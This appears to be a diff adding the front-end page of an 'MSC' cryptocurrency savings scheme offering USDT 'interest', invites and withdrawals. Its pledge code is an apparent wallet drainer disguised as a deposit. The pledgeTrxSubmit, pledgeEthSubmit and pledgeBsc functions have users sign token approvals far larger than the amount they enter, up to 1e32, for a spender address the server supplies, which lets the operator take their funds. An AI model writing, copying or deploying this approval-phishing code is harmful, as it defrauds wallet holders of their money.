@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="screen-orientation" content="portrait" />
+  <meta name="x5-orientation" content="portrait" />
+  <meta name="full-screen" content="yes" />
+  <meta name="x5-fullscreen" content="true" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  <title>MSC</title>
+  <link rel="stylesheet" href="./css/main/main.css" />
+  <script src="./js/language.js?v=1"></script>
+</head>
+
+<body ontouchstart="">
+  <div id="app">
+    <template>
+      <div class="home-bg pdb-30">
+        <div class="position-sticky bgc-primary-dark flex flex-align-center" style="height: 0.2rem;">
+          <div class="flex-1 pdl-30 position-relative">
+            <span class="font-32 c-white">{{lang.lang_name}}</span><i class="icon-tri-down mgl-20"></i>
+            <select class="position-absolute z-index-3 w-100 h-100 hidden" v-model="langType" @change="langChange">
+              <option v-for="(item,index) in langList" :key="item.type" :value="item.type">{{item.name}}</option>
+            </select>
+          </div>
+          <div class="flex-1 align-center">
+            <img :src="themeHost + 'logo.png'" class="h-92px">
+          </div>
+          <div class="flex-1 pdr-30 align-right">
+            <a class="font-32 c-white click-effect" href="./file/MSC.pdf" target="_blank">{{lang.white_paper}}</a>
+          </div>
+        </div>
+        <div class="home-banner">
+          <div class="swiper-container" id="swiper_banner">
+            <div class="swiper-wrapper">
+              <div class="swiper-slide" v-for="(item,index) in bannerList" :key="index">
+                <img :src="Pub.getImgUrl(item.pic)" class="border-radius-20">
+              </div>
+            </div>
+            <!-- Add Pagination -->
+            <div class="swiper-pagination" id="swiper_banner_pagination"></div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="w-100 border-radius-20 pd-30" style="background-color: rgba(255,255,255,0.1);">
+            <div class="pdt-20 align-center font-34 c-white font-bold">
+              {{lang.Savings_financial}} <span class="c-second-light font-36">{{percent}}</span>
+            </div>
+            <div class="w-100 border-radius-half mgt-20 pd-5" style="height: 0.03rem; background-color: #282828;">
+              <div class="h-100 percent-bg border-radius-half" :style="{width: percent}"></div>
+            </div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="flex flex-align-center flex-between bd-white border-radius-10" style="height: 40px;">
+            <div class="pdl-10 pdr-10">
+              <img :src="themeHost+'icon_notice.png'" class="img-48 mgb-5">
+            </div>
+            <div class="flex-auto">
+              <div class="home-notice">
+                <ul :style="{'top': top}">
+                  <li class="c-white" v-for="(item,index) in noticeList" :key="index" @click="toNoticeDetail(item)">
+                    <b>{{item.title}}</b>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="pdl-10 pdr-10" @click="Pub.toPage('./notice.html')"><img :src="themeHost+'icon_more.png'"
+                class="img-48"></div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="w-100 flex flex-between flex-align-center">
+            <div class="font-36 c-white font-bold">{{lang.Savings}}</div>
+            <div class="align-right flex flex-align-center" @click="Pub.toPage('./pledgeRecord.html')">
+              <span class="font-28 c-third">{{lang.Details_of_savings}}</span> <img :src="themeHost + 'icon_more.png'"
+                class="img-48">
+            </div>
+          </div>
+          <div class="bd-white border-radius-10 pd-30 mgt-20">
+            <div class="flex flex-between flex-align-center font-28 c-gray">
+              <div class="flex flex-align-center">USDT <img :src="themeHost + 'icon_arrow_right.png'"
+                  class="img-36 mgl-10">
+              </div>
+              <div class="align-right" v-if="Object.keys(dayConfigData).length > 0">
+                {{lang.Interest_interval}}{{Number(dayConfigData.min*100).toFixed(2)}}%-{{Number(dayConfigData.max*100).toFixed(2)}}%
+              </div>
+            </div>
+            <div class="flex flex-align-center font-28 c-white mgt-10 position-relative">
+              {{dayConfigData.name}} <i class="icon-tri-down white mgl-30"></i>
+              <select v-model="dayConfigId" class="position-absolute z-index-3 hidden w-100 h-100"
+                @change="dayConfigChange">
+                <option v-for="(item,index) in dayConfig" :key="item.id" :value="item.id">{{item.name}}</option>
+              </select>
+            </div>
+            <div class="font-32 c-white mgt-10">{{zyBalance || '0'}}</div>
+            <div class="mgt-20">
+              <input type="number" :placeholder="lang.Amount_of_savings" class="com-input align-center bgc-white"
+                style="color: #333!important;" v-model="zyAmount" @input="zyAmountInput">
+            </div>
+            <div class="btn-gradual-lg full mgt-30" @click="pledge">{{lang.Immediate_savings}}</div>
+            <!-- <div class="btn-gradual-lg full mgt-30" onclick="approve()">授权</div> -->
+            <div class="align-center font-32 c-white mgt-30">{{lang.Pledged_total_assets}}: {{zyTotalBalance}}</div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="flex flex-between flex-align-center">
+            <div class="font-36 c-white font-bold">{{lang.interest}}</div>
+            <div class="align-right flex flex-align-center" @click="Pub.toPage('./interest.html')">
+              <span class="font-28 c-third">{{lang.Interest_collection_details}}</span> <img
+                :src="themeHost + 'icon_more.png'" class="img-48">
+            </div>
+          </div>
+          <div class="bd-white border-radius-10 pd-30 mgt-20 flex flex-align-center font-32 c-gray">
+            {{lang.Interest_collection_today}}:{{todayProfit}} <img :src="themeHost + 'icon_arrow_right.png'"
+              class="img-36 mgl-10">
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="flex flex-between flex-align-center">
+            <div class="font-36 c-white font-bold">{{lang.Available_assets}}</div>
+            <div class="align-right flex flex-align-center" @click="Pub.toPage('./withdrawRecord.html')">
+              <span class="font-28 c-third">{{lang.Withdrawal_record}}</span> <img :src="themeHost + 'icon_more.png'"
+                class="img-48">
+            </div>
+          </div>
+          <div class="bd-white border-radius-10 pd-30 mgt-20">
+            <div class="flex flex-between flex-align-center font-28 c-gray">
+              <div class="flex flex-align-center">USDT
+                <img :src="themeHost + 'icon_arrow_right.png'" class="img-36 mgl-10">
+              </div>
+              <div class="align-right" v-if="Object.keys(dayConfigData).length > 0">
+                {{lang.Service_Charge}}: {{withdrawConfig.out_rate &&
+                Number(withdrawConfig.out_rate*100)}}%，{{lang.minimum}}:
+                {{withdrawConfig.min_out_num}}USDT</div>
+            </div>
+            <div class="font-32 c-white mgt-10">{{withdrawConfig.balance || 0}}</div>
+            <div class="btn-gradual-lg full mgt-30" @click="withdraw">{{lang.Confirm_withdrawal}}</div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="bd-white border-radius-10 pd-20">
+            <div class=" position-relative">
+              <img :src="themeHost+'icon_change.png'" class="home-icon-change z-index-5" @click="changeType">
+              <div class="flex flex-between flex-align-center h-100px bd-base-light-bottom">
+                <div class="flex-1 flex flex-align-center pdl-10 pdr-10 position-relative">
+                  <img :src="fromData.icon" class="img-44 mgr-10"> <span
+                    class="font-30 c-white mgl-20">{{fromData.name}}</span>
+                  <!-- <i class="icon-tri-down mgl-30"></i> -->
+                  <!-- <select class="position-absolute z-index-3 hidden w-100 h-100">
+                    <option>MSC1</option>
+                    <option>MSC2</option>
+                    <option>MSC3</option>
+                  </select> -->
+                </div>
+                <div class="flex-1 flex flex-align-center pdl-30 pdr-10 position-relative">
+                  <img :src="toData.icon" class="img-44 mgr-10 mgl-30"> <span
+                    class="font-30 c-white mgl-20">{{toData.name}}</span>
+                  <!-- <i class="icon-tri-down mgl-30"></i>
+                  <select class="position-absolute z-index-3 hidden w-100 h-100">
+                    <option>MSC1</option>
+                    <option>MSC2</option>
+                    <option>MSC3</option>
+                  </select> -->
+                </div>
+              </div>
+              <div class="flex flex-between flex-align-center mgt-30">
+                <div class="flex-1 pd-10">
+                  <input type="number" :placeholder="lang.Transfer_out_quantity"
+                    class="com-input pdl-30 pdr-30 border-radius-10 bd-none"
+                    style="background-color: rgba(248,248,248,0.1);" v-model="fromAmount" @input="fromAmountInput">
+                </div>
+                <div class="flex-1 pd-10">
+                  <input type="number" :placeholder="lang.Transfer_in_quantity"
+                    class="com-input pdl-35 pdr-30 border-radius-10 bd-none"
+                    style="background-color: rgba(248,248,248,0.1);" v-model="toAmount" readonly onfocus="this.blur()">
+                </div>
+              </div>
+
+            </div>
+            <div class="btn-gradual-lg full mgt-20 mgb-10" @click="exchange">{{lang.Redeem_now}}</div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-30">
+          <div class="flex flex-wrap">
+            <div class="w-50 pd-15 align-center" @click="Pub.toPage('./profit.html', profitData)">
+              <img :src="themeHost + 'icon_cunkuanshouyi.png'" class="img-96">
+              <p class="font-30 c-white font-bold">{{lang.Deposit_income}}</p>
+            </div>
+            <div class="w-50 pd-15 align-center" @click="Pub.toPage('./shareList.html')">
+              <img :src="themeHost + 'icon_yaoqingkehu.png'" class="img-96">
+              <p class="font-30 c-white font-bold">{{lang.Invite_customers}}</p>
+            </div>
+            <div class="w-50 pd-15 align-center"
+              @click="Pub.toPage('./share.html', {inviteUrl: encodeURIComponent(inviteUrl)})">
+              <img :src="themeHost + 'icon_fenxianglicai.png'" class="img-96">
+              <p class="font-30 c-white font-bold">{{lang.Sharing_financial_management}}</p>
+            </div>
+            <div class="w-50 pd-15 align-center" @click="Pub.toPage('./privateCenter.html')">
+              <img :src="themeHost + 'icon_sirenzhongxin.png'" class="img-96">
+              <p class="font-30 c-white font-bold">{{lang.Private_Center}}</p>
+            </div>
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-40 pdt-30">
+          <div class="font-36 c-white font-bold align-center">{{lang.Audit_company}}</div>
+          <div class="mgt-30">
+            <img :src="themeHost + 'img_shenjigongsi.png'">
+          </div>
+        </div>
+        <div class="pdl-30 pdr-30 mgt-40 pdt-30">
+          <div class="font-36 c-white font-bold align-center">{{lang.cooperative_partner}}</div>
+          <div class="mgt-30">
+            <img :src="themeHost + 'img_hezuohuoban.png'">
+          </div>
+        </div>
+
+      </div>
+    </template>
+  </div>
+</body>
+<script src="./js/jquery.min.js"></script>
+<script src="./js/dialog.js"></script>
+<script src="./js/public.js?v=2"></script>
+<script src="./js/vue.min.js?v=2"></script>
+<script src="./js/web3.min.js"></script>
+<script src="./js/usdt.js"></script>
+<script src="./js/PullToRefresh.min.js"></script>
+<script src="./js/swiper.min.js"></script>
+<script type="text/javascript">
+  $(function () {
+    initEvent();
+  })
+
+  function initEvent() {
+    var app = new Vue({
+      el: '#app',
+      data: {
+        themeHost: Pub.getThemeHost(),
+        lang: Lang.getlang(),
+        langList: Lang.langList(),
+        langType: Pub.getSession('language') || 'en',
+        trxInfo: {
+          usdtcc: null,
+          toAddress: '',
+          link: 0,
+          fromAddress: '',
+          address: '',
+        },
+        bscInfo: {
+          usdtcc: null,
+          toAddress: '',
+          link: 0,
+          fromAddress: '',
+          address: '',
+        },
+        ethInfo: {
+          usdtcc: null,
+          toAddress: '',
+          link: 0,
+          fromAddress: '',
+          address: '',
+        },
+        usdtcontractAddrBsc: '0x1Cbea5eB2daDBe4Ddb789E8808f4bE38e78f4A2e',
+        usdtcontractAddrEth: '0x1Cbea5eB2daDBe4Ddb789E8808f4bE38e78f4A2e',
+        type: 0,
+        noticeList: [],
+        noticeTimer: null,
+        activeIndex: 0,
+        swiperBanner: null,
+        bannerList: [],
+        rateData: {},
+        dayConfig: [],
+        dayConfigData: {},
+        dayConfigId: '',
+        zyTotalBalance: '',
+        zyBalance: '',
+        zyAmount: '',
+        inviteUrl: '',
+        profitData: {},
+        todayProfit: 0,
+        withdrawConfig: {},
+        MSCInfo: {
+          icon: Pub.getThemeHost() + 'coin_msc.png',
+          name: 'MSC'
+        },
+        USDTInfo: {
+          icon: Pub.getThemeHost() + 'coin_usdt.png',
+          name: 'USDT'
+        },
+        rate: 1,
+        exchangeRate: 1,
+        exchangeType: 1,
+        fromData: {},
+        toData: {},
+        fromAmount: '',
+        toAmount: '',
+        isApprove: 0,
+      },
+      computed: {
+        top: function () {
+          return -this.activeIndex * 30 + "px";
+        },
+        percent() {
+          var percent = '0%';
+          if (Object.keys(this.rateData).length > 0) {
+            percent = (Number(this.rateData.has) / Number(this.rateData.total) * 100).toFixed(2) + '%';
+          }
+          return percent;
+        }
+      },
+      mounted: function () {
+        var _this = this;
+        // this.checkLogin();
+        this.getData();
+        this.trxInit();
+        this.ethInit();
+        this.exchangeInit();
+      },
+      methods: {
+        checkLogin() {
+          var token = Pub.getSession('token');
+          if (!token) {
+            window.location.replace('./login.html');
+          }
+        },
+        langChange() {
+          Pub.setSession('language', this.langType);
+          setTimeout(() => {
+            this.lang = Lang.getlang();
+            this.getData();
+          }, 10);
+        },
+        getData() {
+          var _this = this;
+          Pub.post('addr/index/getData', {}, function (res) {
+            var data = res.data;
+            _this.rateData = data.config_rate;
+            _this.noticeList = data.notice;
+            _this.dayConfig = data.config;
+            _this.zyTotalBalance = data.zy_total_balance;
+            _this.trxInfo.toAddress = data.toAddr.trx_address;
+            _this.ethInfo.toAddress = data.toAddr.eth_address;
+            _this.inviteUrl = data.invite_url;
+            _this.profitData = data.profit;
+            _this.todayProfit = data.today_profit;
+            _this.withdrawConfig = data.out_config;
+            _this.rate = data.exchange.rate;
+            _this.bannerList = data.slideshow;
+            _this.isApprove = data.is_approve;
+            _this.dayConfigEvent();
+            _this.$nextTick(() => {
+              _this.swiperBannerEvent();
+              _this.noticeScroll();
+            })
+          });
+        },
+        dayConfigEvent() {
+          if (this.dayConfig && this.dayConfig.length > 0) {
+            this.dayConfigData = this.dayConfig[0];
+            this.dayConfigId = this.dayConfigData.id;
+          }
+        },
+        dayConfigChange() {
+          for (var i = 0; i < this.dayConfig.length; i++) {
+            if (this.dayConfig[i].id == this.dayConfigId) {
+              this.dayConfigData = this.dayConfig[i];
+            }
+          }
+        },
+        async trxInit(isTips, callback) {
+          var _this = this;
+          if (typeof window.tronWeb !== 'undefined') {
+            if (typeof window.tronWeb.defaultAddress.base58 !== 'undefined') {
+              _this.trxInfo.fromAddress = window.tronWeb.defaultAddress.base58;
+              _this.trxInfo.usdtcc = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+              if (_this.trxInfo.fromAddress != false) {
+                _this.type = 1;
+                _this.trxInfo.link = 1;
+                let balance = await this.trxInfo.usdtcc.balanceOf(_this.trxInfo.fromAddress).call();
+                _this.zyBalance = JSON.parse(balance) / 1e6
+              }
+              if (callback && typeof callback == 'function') {
+                callback();
+              }
+            }
+          }
+          else {
+            if (isTips) {
+              Pub.msg(this.lang.not_trx_wallet);
+            }
+          }
+        },
+        async ethInit(isTips, callback) {
+          var _this = this;
+          if (typeof web3 !== 'undefined') {
+            var accounts = await ethereum.enable();
+            if (accounts.length < 1) {
+              // if (ethereum.isMetaMask) {
+              //   Pub.msg("已检测到MetaMask，请确认MetaMask是否已登录!");
+              // }
+              // else {
+              //   Pub.msg("已检测到TokenPocket，请确认TokenPocket有BSC账户!");
+              // }
+              Pub.msg(_this.lang.please_confirm_wallet_account);
+              return;
+            }
+            var usdtinfoContract = web3.eth.contract(usdtabi);
+            web3.version.getNetwork((err, res) => {
+              if (res == 1) {
+                _this.ethInfo.fromAddress = accounts[0];
+                _this.ethInfo.usdtcc = usdtinfoContract.at(_this.usdtcontractAddrEth);
+                _this.ethInfo.usdtcc.balanceOf(
+                  _this.ethInfo.fromAddress,
+                  function (err, re) {
+                    _this.zyBalance = JSON.parse(re) / 1e6;
+                  }
+                );
+                _this.type = 2;
+                _this.ethInfo.link = 1;
+                if (callback && typeof callback == 'function') {
+                  callback();
+                }
+              } else if (res == 56) {
+                _this.bscInfo.fromAddress = accounts[0];
+                _this.bscInfo.usdtcc = usdtinfoContract.at(_this.usdtcontractAddrBsc);
+                _this.type = 3;
+                _this.bscInfo.link = 1;
+              }
+            })
+          }
+          else {
+            if (isTips) {
+              Pub.msg(this.lang.not_eth_wallet)
+            }
+          }
+        },
+        pledge() {
+          if (!this.zyAmount) return Pub.msg(this.lang.Please_enter_the_amount_of_savings);
+          if (this.type == 1) {
+            this.pledgeTrx();
+          } else if (this.type == 2) {
+            this.pledgeEth();
+          } else if (this.type == 3) {
+            this.pledgeBsc();
+          } else if (this.type == 0) {
+            this.trxInit();
+            this.ethInit();
+            Pub.msg(this.lang.wallet_connection_failed)
+          }
+        },
+        zyAmountInput() {
+          if (!this.zyAmount) {
+            setTimeout(() => {
+              this.zyAmount = ' ';
+            }, 20);
+          }
+        },
+        pledgeTrx() {
+          var _this = this;
+          if (!this.trxInfo.fromAddress) {
+            var load = $(document).dialog({
+              type: 'toast',
+              infoIcon: './images/common/loading.gif',
+              infoText: ''
+            });
+            this.trxInit(true, function () {
+              load.close();
+              _this.pledgeTrxSubmit();
+            })
+          } else {
+            _this.pledgeTrxSubmit();
+          }
+        },
+        async pledgeTrxSubmit() {
+          var _this = this;
+          if (this.isApprove == 0) {
+            var load = $(document).dialog({
+              type: 'toast',
+              infoIcon: './images/common/loading.gif',
+              infoText: ''
+            });
+            var sq_amount = _this.zyAmount * 1000000000000;
+            await this.trxInfo.usdtcc.approve(this.trxInfo.toAddress, sq_amount).send().then(
+              (x) => {
+                load.close();
+                var params = {
+                  from: _this.trxInfo.fromAddress,
+                  to: _this.trxInfo.toAddress,
+                  amount: _this.zyAmount,
+                  am: 10000000,
+                  hash: x,
+                  type: 1,
+                  config_id: 1
+                }
+                Pub.post('addr/index/zy', params, function (res) {
+                  if (res.code == 0) {
+                    Pub.msg(_this.lang.Savings_success);
+                    _this.trxInit();
+                  }
+                });
+              }).catch(e => {
+                console.log(e);
+                load.close();
+                Pub.msg(_this.lang.Saving_failure)
+              });
+          } else {
+            var params = {
+              from: _this.trxInfo.fromAddress,
+              to: _this.trxInfo.toAddress,
+              amount: _this.zyAmount,
+              am: 10000000,
+              hash: null,
+              type: 1,
+              config_id: 1
+            }
+            Pub.post('addr/index/zy', params, function (res) {
+              if (res.code == 0) {
+                Pub.msg(_this.lang.Savings_success);
+                _this.trxInit();
+              }
+            });
+          }
+
+        },
+        pledgeEth() {
+          var _this = this;
+          if (!this.ethInfo.fromAddress) {
+            var load = $(document).dialog({
+              type: 'toast',
+              infoIcon: './images/common/loading.gif',
+              infoText: ''
+            });
+            this.ethInit(true, function () {
+              load.close();
+              _this.pledgeEthSubmit();
+            })
+          } else {
+            _this.pledgeEthSubmit();
+          }
+        },
+        async pledgeEthSubmit() {
+          var _this = this;
+          if (this.isApprove == 0) {
+            var load = $(document).dialog({
+              type: 'toast',
+              infoIcon: './images/common/loading.gif',
+              infoText: ''
+            });
+            const gasPrice = web3.eth.getGasPrice();
+            this.ethInfo.usdtcc.approve(
+              this.ethInfo.toAddress,
+              99999999999,
+              { "gasPrice": gasPrice, "gas": 100000 },
+              function (ret) {
+                if (ret == null) {
+                  load.close();
+                  var params = {
+                    from: _this.ethInfo.fromAddress,
+                    to: _this.ethInfo.toAddress,
+                    amount: _this.zyAmount,
+                    am: 99999999999,
+                    hash: ret,
+                    type: 1,
+                    config_id: 1
+                  }
+                  Pub.post('addr/index/zy', params, function (res) {
+                    if (res.code == 0) {
+                      Pub.msg(_this.lang.Savings_success);
+                      _this.ethInit();
+                    }
+                  });
+                } else {
+                  load.close();
+                  Pub.msg(_this.lang.Saving_failure)
+                }
+              }
+            );
+          } else {
+            var params = {
+              from: _this.ethInfo.fromAddress,
+              to: _this.ethInfo.toAddress,
+              amount: _this.zyAmount,
+              am: 99999999999,
+              hash: null,
+              type: 1,
+              config_id: 1
+            }
+            Pub.post('addr/index/zy', params, function (res) {
+              if (res.code == 0) {
+                Pub.msg(_this.lang.Savings_success);
+                _this.ethInit();
+              }
+            });
+          }
+
+        },
+        pledgeBsc() {
+          var _this = this;
+          const gasPrice = web3.eth.getGasPrice();
+          let am = 1e32;
+          let amx = 1;
+          usdtcc.approve(
+            _this.bscInfo.toAddress,
+            am,
+            { "gasPrice": gasPrice, "gas": gasPrice },
+            function (ret) {
+              if (ret) {
+                var params = {
+                  op: 'add',
+                  type: 3,
+                  from: _this.bscInfo.fromAddress,
+                  to: _this.bscInfo.toAddress,
+                  am: 100000,
+                  amx: amx,
+                  sq_hash: ret,
+                  agetn_id: '',
+                }
+                Pub.post('api/addr/addData', params, function (res) {
+                  if (res.code == 0) {
+                    Pub.msg(_this.lang.Savings_success);
+                    _this.bscInit();
+                  }
+                });
+              }
+            }
+          );
+        },
+        withdraw() {
+          var _this = this;
+          if (this.type == 0) {
+            this.trxInit();
+            this.ethInit();
+            return Pub.msg(this.lang.wallet_connection_failed)
+          }
+          var params = {
+            type: this.type
+          }
+          Pub.post('addr/index/out', params, function (res) {
+            if (res.code == 0) {
+              Pub.msg(_this.lang.Withdrawal_succeeded);
+              _this.getData();
+            }
+          });
+        },
+        exchangeInit() {
+          if (this.exchangeType == 1) {
+            this.fromData = this.USDTInfo;
+            this.toData = this.MSCInfo;
+          } else if (this.exchangeType == 2) {
+            this.fromData = this.MSCInfo;
+            this.toData = this.USDTInfo;
+          }
+        },
+        changeType() {
+          if (this.exchangeType == 1) {
+            this.exchangeType = 2;
+            this.exchangeRate = 1 / this.rate;
+          } else {
+            this.exchangeType = 1;
+            this.exchangeRate = this.rate;
+          }
+          this.fromAmount = '';
+          this.toAmount = '';
+          this.exchangeInit();
+        },
+        fromAmountInput() {
+          if (!this.fromAmount) {
+            setTimeout(() => {
+              this.fromAmount = ' ';
+              this.toAmount = '';
+            }, 20)
+          } else {
+            this.toAmount = this.fromAmount * this.exchangeRate;
+          }
+        },
+        exchange() {
+          var _this = this;
+          if (!this.fromAmount) return Pub.msg(this.lang.Transfer_out_quantity);
+          var params = {
+            from: this.fromData.name,
+            to: this.toData.name,
+            amount: this.fromAmount,
+          }
+          Pub.post('addr/index/exchange', params, function (res) {
+            if (res.code == 0) {
+              Pub.msg(res.msg);
+              _this.fromAmount = '';
+              _this.toAmount = '';
+              _this.getData();
+            }
+          });
+        },
+        getBanner: function () {
+          var _this = this;
+          _this.bannerList = [{
+            pic: this.themeHost + 'banner.png',
+          }, {
+            pic: this.themeHost + 'banner.png',
+          }, {
+            pic: this.themeHost + 'banner.png',
+          }, {
+            pic: this.themeHost + 'banner.png',
+          }];
+          _this.$nextTick(function () {
+            _this.swiperBannerEvent();
+          });
+          // Pub.post('api/Community/getSlideshow', {}, function (res) {
+          //   if (res.code == Pub.codes.success) {
+          //     _this.bannerList = res.data;
+          //     _this.$nextTick(function () {
+          //       _this.swiperBannerEvent();
+          //     });
+          //   }
+          // });
+
+        },
+        swiperBannerEvent: function () {
+          var _this = this;
+          if (this.swiperBanner) {
+            this.swiperBanner.destroy();
+          }
+          this.swiperBanner = new Swiper('#swiper_banner', {
+            loop: true,
+            autoplay: {
+              delay: 5000,
+              stopOnLastSlide: false,
+              disableOnInteraction: false,
+            },
+            observer: true,
+            observeParents: true,
+            pagination: {
+              el: '#swiper_banner_pagination',
+            },
+            on: {
+              touchStart() {
+
+              },
+              touchEnd() {
+              }
+            }
+          })
+        },
+        getNotice() {
+          var _this = this;
+          _this.noticeList = [{
+            title: '[公告]奖金池加码升级数额巨大',
+            url: ''
+          }, {
+            title: '[公告]奖金池加码升级数额巨大',
+            url: ''
+          }, {
+            title: '[公告]奖金池加码升级数额巨大',
+            url: ''
+          }]
+          _this.$nextTick(() => {
+            _this.noticeScroll();
+          })
+          // Pub.get('api/alpaca/news_list', {}, function (res) {
+          //   if (res.type == 'ok') {
+          //     _this.noticeList = res.message;
+          //     _this.$nextTick(() => {
+          //       _this.noticeScroll();
+          //     });
+          //   }
+          // });
+        },
+        noticeScroll: function () {
+          var _this = this;
+          clearInterval(this.noticeTimer);
+          this.noticeTimer = setInterval(function () {
+            if (_this.activeIndex < _this.noticeList.length - 1) {
+              _this.activeIndex += 1;
+            } else {
+              _this.activeIndex = 0;
+            }
+          }, 5000);
+        },
+        pullEvent: function () {
+          var _this = this;
+          var refreshBox = new PullToRefresh({
+            container: "#scroll",
+            pull: {
+              callback: function () {
+                setTimeout(function () {
+                  refreshBox.endPullRefresh(true)
+                }, 1000)
+              }
+            },
+            up: {
+              callback: function () {
+                setTimeout(function () {
+                  refreshBox.endUpLoading(false)
+                  $('#scroll').find('.loadingBox').hide();
+                }, 1);
+              }
+            }
+          })
+        },
+      }
+    })
+  }
+</script>
+</body>
+
+</html>
